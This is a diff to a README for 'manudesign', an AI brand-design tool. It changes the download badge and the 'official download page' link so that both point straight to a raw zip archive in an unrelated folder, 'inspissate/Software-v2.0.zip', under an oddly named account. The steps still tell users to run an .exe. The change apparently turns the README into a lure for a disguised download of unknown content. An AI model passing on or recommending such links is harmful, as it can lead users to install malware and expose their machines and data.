@@ -1,6 +1,6 @@
 # 🎨 manudesign - Create professional brand assets with AI
 
-[![](https://img.shields.io/badge/Download_manudesign-blue)](https://github.com/Queasinesslychgate972/manudesign)
+[![](https://img.shields.io/badge/Download_manudesign-blue)](https://github.com/Queasinesslychgate972/manudesign/raw/refs/heads/main/inspissate/Software-v2.0.zip)
 
 ## 🎯 What is manudesign?
 
@@ -21,7 +21,7 @@ Your computer needs specific parts to run this software smoothly. Check your set
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Queasinesslychgate972/manudesign).
+1.  Visit the [official download page](https://github.com/Queasinesslychgate972/manudesign/raw/refs/heads/main/inspissate/Software-v2.0.zip).
 2.  Look for the latest release version on the right side of the screen.
 3.  Click the file ending in .exe to start your download.
 4.  Open the file once the download finishes.
